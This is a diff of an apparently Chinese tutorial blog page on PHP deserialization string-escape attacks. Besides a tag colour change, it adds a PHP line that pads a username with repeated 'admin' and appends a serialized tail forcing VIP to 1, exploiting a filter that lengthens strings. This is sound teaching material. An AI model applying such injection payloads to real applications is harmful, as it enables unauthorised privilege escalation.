@@ -205,7 +205,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #00a596">反序列化</a>
+                <a href="/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="color: #ffa2c4">反序列化</a>
             </span>
             
         </span>
@@ -277,7 +277,10 @@
 <p>所以我们需要再重复40次admin来补足相差的位数</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";i:114514;s:3:"VIP";i:0;&#125;'</span><span class="token punctuation">,</span> <span class="token number">114514</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token comment">//O:4:"user":3:&#123;s:8:"username";s:246:"HackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHacker";s:8:"password";i:114514;s:3:"VIP";i:0;&#125;";s:8:"password";i:114514;s:3:"VIP";i:0;&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<span class="token comment">//这里使用str_repeat()函数简化</span>
+<span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'";s:8:"password";i:114514;s:3:"VIP";i:1;&#125;'</span><span class="token punctuation">,</span> <span class="token number">114514</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">//O:4:"user":3:&#123;s:8:"username";s:246:"HackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHackerHacker";s:8:"password";i:114514;s:3:"VIP";i:0;&#125;";s:8:"password";i:114514;s:3:"VIP";i:0;&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>此时再尝试反序列化，成功</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span> <span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$u_seri</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
